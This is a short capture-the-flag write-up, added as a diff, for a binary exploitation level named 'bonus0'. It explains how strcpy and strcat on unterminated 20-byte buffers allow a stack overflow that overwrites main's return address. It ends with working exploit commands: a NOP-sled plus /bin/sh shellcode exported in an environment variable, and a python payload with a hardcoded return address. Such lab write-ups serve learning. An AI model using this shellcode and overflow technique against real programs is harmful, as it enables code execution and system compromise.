@@ -1,0 +1,21 @@
+* In this level the main() contain a buffer size 42, the buffer get passed to function pp(),
+* function pp() also has two buffers with 20 bytes each, this function calls another function p()
+* function p() reads 4096 bytes from the user  and copy at most the first 20 bytes to the buffer sended by p()
+(the first call with the first buffer1 and second time with the other buffer2).
+
+* after the two calls to p() in pp() it copies buffer1 to the buffer[42] sended by main(), using strcpy, than append a space , after that using strcat()
+buffer2 is concatenated .
+
+
+* Since the two buffers on pp() lies respectivly on the memory we can abuse strcpy to run a buffer overflow , so we can overwrite the return address of main
+* to solve this level i injected a shellcode in environment variable , preceded with a bunch of nops .
+* the return address of main() is 54 bytes far from the buffer means the address that we will return to should be at the byte 15 of buffer2,
+(20 b of buffer1 + 19 of buffer2) + space + 14 from buffer2.
+
+------------------------------------------------------------------
+
+export SHELLCODE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\n"')
+
+(python -c 'print "A" * 20' ; sleep 1; python -c 'print "A" * 14 + "\xbf\xff\xf5\xb0"[::-1] + "A"'; cat ) | ./bonus0
+
+------------------------------------------------------------------
